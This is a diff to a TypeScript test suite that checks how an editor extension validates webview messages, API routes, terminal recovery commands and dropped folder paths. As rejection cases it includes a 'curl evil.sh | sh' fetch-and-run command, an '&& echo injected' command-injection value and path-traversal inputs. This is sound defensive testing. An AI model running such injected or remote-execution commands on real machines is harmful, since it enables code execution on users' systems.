@@ -60,10 +60,14 @@ function createRalphRun() {
 }
 
 describe('webview message validation', () => {
-  it('accepts only bounded Handy requests with fixed actions', () => {
+  it('accepts only bounded dictation requests with fixed actions and providers', () => {
     for (const action of ['status', 'start', 'stop', 'cancel']) {
-      const message = { type: 'handy/request', payload: { requestId: 'handy-1', action } };
+      const message = { type: 'dictation/request', payload: { requestId: 'dictation-1', action } };
       expect(parseWebviewMessage(message)).toEqual(message);
+      for (const provider of ['handy', 'hex']) {
+        const withProvider = { ...message, payload: { ...message.payload, provider } };
+        expect(parseWebviewMessage(withProvider)).toEqual(withProvider);
+      }
     }
     for (const payload of [
       {},
@@ -71,8 +75,10 @@ describe('webview message validation', () => {
       { requestId: 'x'.repeat(129), action: 'start' },
       { requestId: '1', action: 'toggle' },
       { requestId: '1', action: '--anything' },
+      { requestId: '1', action: 'start', provider: 'other' },
+      { requestId: '1', action: 'start', provider: null },
     ]) {
-      expect(parseWebviewMessage({ type: 'handy/request', payload })).toBeNull();
+      expect(parseWebviewMessage({ type: 'dictation/request', payload })).toBeNull();
     }
   });
   it('allows only read-only session-scoped background process inspection with valid byte cursors', () => {
@@ -217,6 +223,13 @@ describe('webview message validation', () => {
     expect(isAllowedApiRequest('POST', '/varro/prompt-completion/test')).toBe(true);
     expect(isAllowedApiRequest('POST', '/varro/session/s/followups')).toBe(true);
     expect(isAllowedApiRequest('POST', '/varro/session/s/followups/dismiss')).toBe(true);
+    expect(
+      isAllowedApiRequest('POST', '/varro/session/s/followups/session?directory=%2Frepo')
+    ).toBe(true);
+    expect(isAllowedApiRequest('GET', '/varro/session/s/followups/session')).toBe(false);
+    expect(isAllowedApiRequest('POST', '/varro/session/s/followups/session?model=other')).toBe(
+      false
+    );
     expect(isAllowedApiRequest('GET', '/varro/session/s/followups/dismiss')).toBe(false);
     expect(isAllowedApiRequest('POST', '/varro/session/s/followups?directory=%2Frepo')).toBe(true);
     expect(isAllowedApiRequest('GET', '/varro/session/s/followups')).toBe(false);
@@ -263,6 +276,11 @@ describe('webview message validation', () => {
     );
     expect(isAllowedApiRequest('GET', '/varro/workspace-file/pick')).toBe(true);
     expect(isAllowedApiRequest('GET', '/varro/opencode-config')).toBe(true);
+    expect(isAllowedApiRequest('POST', '/varro/mcp-config')).toBe(true);
+    expect(isAllowedApiRequest('POST', '/varro/mcp-config/open')).toBe(true);
+    expect(isAllowedApiRequest('GET', '/varro/mcp-config')).toBe(false);
+    expect(isAllowedApiRequest('GET', '/varro/mcp-config/open')).toBe(false);
+    expect(isAllowedApiRequest('POST', '/varro/mcp-config?path=/etc/other.json')).toBe(false);
     expect(isAllowedApiRequest('POST', '/varro/opencode-config/model-routing')).toBe(true);
     expect(isAllowedApiRequest('GET', '/varro/opencode-config/permissions')).toBe(true);
     expect(isAllowedApiRequest('POST', '/varro/opencode-config/permissions')).toBe(true);
@@ -279,6 +297,12 @@ describe('webview message validation', () => {
     expect(isAllowedApiRequest('PATCH', '/api/permission/saved/saved-1')).toBe(false);
     expect(isAllowedApiRequest('POST', '/varro/permission/server-memory')).toBe(false);
     expect(isAllowedApiRequest('POST', '/varro/permission/judge')).toBe(true);
+    expect(isAllowedApiRequest('POST', '/varro/permission/global-allow?directory=%2Frepo-a')).toBe(
+      true
+    );
+    expect(isAllowedApiRequest('GET', '/varro/opencode-config/global-permissions')).toBe(true);
+    expect(isAllowedApiRequest('POST', '/varro/opencode-config/global-permissions')).toBe(true);
+    expect(isAllowedApiRequest('DELETE', '/varro/opencode-config/global-permissions')).toBe(false);
     expect(isAllowedApiRequest('POST', '/varro/permission/project-allow?directory=%2Frepo-a')).toBe(
       true
     );
@@ -522,6 +546,7 @@ describe('webview message validation', () => {
     'bun add -g opencode-ai@latest',
     'brew upgrade opencode',
     'curl -fsSL https://opencode.ai/install | bash',
+    'claude auth login',
   ])('accepts the recovery command %s', (command) => {
     expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toEqual({
       type: 'terminal/run',
@@ -535,6 +560,8 @@ describe('webview message validation', () => {
       'brew upgrade opencode; curl evil.sh | sh',
       'npm i -g opencode-ai ',
       'echo hi',
+      'claude auth login && echo injected',
+      'claude auth login --token secret',
     ]) {
       expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toBeNull();
     }
@@ -644,6 +671,44 @@ describe('webview message validation', () => {
         payload: { id: 1, method: 'get', path: '/session' },
       })
     ).toEqual({ type: 'api/request', payload: { id: 1, method: 'GET', path: '/session' } });
+  });
+
+  it('preserves exact citation opening and rejects non-boolean flags', () => {
+    const message = { type: 'vscode/open', payload: { path: '/repo/app.ts', exact: true } };
+    expect(parseWebviewMessage(message)).toEqual(message);
+    expect(
+      parseWebviewMessage({ type: 'vscode/open', payload: { path: '/repo/app.ts', exact: 'true' } })
+    ).toBeNull();
+    expect(
+      parseWebviewMessage({
+        type: 'api/request',
+        payload: {
+          id: 1,
+          method: 'POST',
+          path: '/varro/citation-paths',
+          body: { paths: ['src/app.ts'] },
+        },
+      })
+    ).not.toBeNull();
+  });
+
+  it('allows only POST without query parameters for citation symbol checks', () => {
+    for (const [method, path, allowed] of [
+      ['POST', '/varro/citation-symbols', true],
+      ['GET', '/varro/citation-symbols', false],
+      ['POST', '/varro/citation-symbols?directory=/other', false],
+    ] as const) {
+      const parsed = parseWebviewMessage({
+        type: 'api/request',
+        payload: {
+          id: 1,
+          method,
+          path,
+          body: { symbols: ['loss_weights()'] },
+        },
+      });
+      expect(parsed !== null).toBe(allowed);
+    }
   });
 
   it('validates permission automation lease metadata on API requests', () => {
@@ -872,6 +937,12 @@ describe('webview message validation', () => {
     }
     expect(parseQueuedMessageUpdate([{ ...valid, agent: 'x'.repeat(513) }])).toBeNull();
     expect(parseQueuedMessageUpdate([{ ...valid, paused: 'false' }])).toBeNull();
+    expect(
+      parseQueuedMessageUpdate([{ ...valid, followupTitle: 'Inspect parser failures' }])
+    ).not.toBeNull();
+    for (const followupTitle of ['', 'x'.repeat(49), 123, 'one\ntwo']) {
+      expect(parseQueuedMessageUpdate([{ ...valid, followupTitle }])).toBeNull();
+    }
     expect(
       parseQueuedMessageUpdate([{ ...valid, queuedContext: { visionDelegationAvailable: 'yes' } }])
     ).toBeNull();
@@ -1550,6 +1621,45 @@ describe('webview message validation', () => {
     ).toBeNull();
   });
 
+  it('validates session-scoped folder openings and read-only location metadata routes', () => {
+    const message = {
+      type: 'vscode/open-folder',
+      payload: { sessionId: 'session-1', directory: '/repo' },
+    };
+    expect(parseWebviewMessage(message)).toEqual(message);
+    for (const payload of [
+      null,
+      {},
+      { sessionId: '../foreign', directory: '/repo' },
+      { sessionId: 'session-1' },
+      { sessionId: 'session-1', directory: 42 },
+    ])
+      expect(parseWebviewMessage({ type: 'vscode/open-folder', payload })).toBeNull();
+    expect(isAllowedApiRequest('GET', '/varro/session/session-1/location?directory=%2Frepo')).toBe(
+      true
+    );
+    expect(isAllowedApiRequest('POST', '/varro/session/session-1/location')).toBe(false);
+    expect(isAllowedApiRequest('GET', '/varro/session/session-1/location?extra=1')).toBe(false);
+  });
+
+  it('validates and preserves selected-model visibility in command state', () => {
+    for (const model of [null, { providerID: 'openai', modelID: 'gpt' }]) {
+      for (const modelVisible of [false, true]) {
+        const message = {
+          type: 'commands/state',
+          payload: { canAbort: false, canSwitchSessions: false, model, modelVisible },
+        };
+        expect(parseWebviewMessage(message)).toEqual(message);
+      }
+      expect(
+        parseWebviewMessage({
+          type: 'commands/state',
+          payload: { canAbort: false, canSwitchSessions: false, model, modelVisible: 'yes' },
+        })
+      ).toBeNull();
+    }
+  });
+
   it('validates editor panel actions and routes', () => {
     expect(parseWebviewMessage({ type: 'chat/new-editor' })).toEqual({ type: 'chat/new-editor' });
     expect(
@@ -1575,6 +1685,33 @@ describe('webview message validation', () => {
         type: 'editor/route-changed',
         payload: { route: { type: 'session', sessionId: '../foreign' } },
       })
+    ).toBeNull();
+  });
+
+  it('preserves file-reference ranges and session scope', () => {
+    const message = {
+      type: 'vscode/open',
+      payload: {
+        path: 'models/file.py',
+        line: 710,
+        endLine: 744,
+        sessionID: 'nested-session',
+        directory: '/repo/packages/app',
+      },
+    };
+    expect(parseWebviewMessage(message)).toEqual(message);
+  });
+
+  it.each([
+    { endLine: 10 },
+    { line: 0, endLine: 10 },
+    { line: 10, endLine: 9 },
+    { line: 10, endLine: 10.5 },
+    { line: 10, endLine: '20' },
+    { line: 10, endLine: Number.MAX_SAFE_INTEGER + 1 },
+  ])('rejects invalid file-reference range %j', (range) => {
+    expect(
+      parseWebviewMessage({ type: 'vscode/open', payload: { path: 'file.py', ...range } })
     ).toBeNull();
   });
 
@@ -1637,6 +1774,51 @@ describe('webview message validation', () => {
         },
       })
     ).toBeNull();
+  });
+
+  it('preserves copied folder metadata, including empty folders', () => {
+    for (const files of [[], [{ name: 'nested/note.txt', content: 'QQ==', size: 1 }]]) {
+      const message = {
+        type: 'files/drop-content',
+        payload: { files, directory: { name: 'external', directories: ['nested', 'empty'] } },
+      };
+      expect(parseWebviewMessage(message)).toEqual(message);
+    }
+  });
+
+  it.each(['../outside', '/absolute', 'C:\\outside', 'nested/../outside'])(
+    'rejects unsafe folder file and directory paths: %s',
+    (path) => {
+      expect(
+        parseWebviewMessage({
+          type: 'files/drop-content',
+          payload: {
+            files: [{ name: path, content: 'QQ==', size: 1 }],
+            directory: { name: 'root', directories: [] },
+          },
+        })
+      ).toBeNull();
+      expect(
+        parseWebviewMessage({
+          type: 'files/drop-content',
+          payload: { files: [], directory: { name: 'root', directories: [path] } },
+        })
+      ).toBeNull();
+    }
+  );
+
+  it('rejects malformed and unbounded copied folder metadata', () => {
+    for (const directory of [
+      null,
+      {},
+      { name: '../outside', directories: [] },
+      { name: 'root', directories: [1] },
+      { name: 'root', directories: Array.from({ length: 201 }, (_, i) => `${i}`) },
+    ]) {
+      expect(
+        parseWebviewMessage({ type: 'files/drop-content', payload: { files: [], directory } })
+      ).toBeNull();
+    }
   });
 
   it('validates delegated image storage and release messages', () => {
@@ -1823,8 +2005,8 @@ describe('parseWebviewMessage protocol coverage', () => {
   }
 
   /**
-   * Types whose payload is optional by design: a missing or garbage payload
-   * degrades to the no-payload form instead of dropping the message. Listing
+   * Types whose payload is optional by design. Most also tolerate garbage,
+   * but an invalid folder target must not fall back to the folder picker. Listing
    * them explicitly means a type cannot quietly join the set later.
    */
   const OPTIONAL_PAYLOAD_TYPES = new Set<WebviewMessage['type']>([
@@ -1843,6 +2025,9 @@ describe('parseWebviewMessage protocol coverage', () => {
     'vscode/open-settings',
     'server/restart',
   ]);
+  const GARBAGE_PAYLOAD_TYPES = new Set<WebviewMessage['type']>(
+    [...OPTIONAL_PAYLOAD_TYPES].filter((type) => type !== 'vscode/open-folder')
+  );
 
   it('tolerates a garbage payload only for the types that opt into it', () => {
     const tolerant = Object.keys(WEBVIEW_MESSAGE_TYPES).filter((type) =>
@@ -1850,16 +2035,17 @@ describe('parseWebviewMessage protocol coverage', () => {
         (payload) => parseWebviewMessage({ type, payload }) !== null
       )
     );
-    expect(tolerant.toSorted()).toEqual([...OPTIONAL_PAYLOAD_TYPES].toSorted());
+    expect(tolerant.toSorted()).toEqual([...GARBAGE_PAYLOAD_TYPES].toSorted());
   });
 
   for (const [type] of entries) {
-    if (OPTIONAL_PAYLOAD_TYPES.has(type)) continue;
+    if (GARBAGE_PAYLOAD_TYPES.has(type)) continue;
     it(`rejects ${type} with a non-object payload`, () => {
       for (const payload of [null, 'string', 42, true, []]) {
         expect(parseWebviewMessage({ type, payload })).toBeNull();
       }
-      expect(parseWebviewMessage({ type })).toBeNull();
+      if (OPTIONAL_PAYLOAD_TYPES.has(type)) expect(parseWebviewMessage({ type })).toEqual({ type });
+      else expect(parseWebviewMessage({ type })).toBeNull();
     });
   }
 });
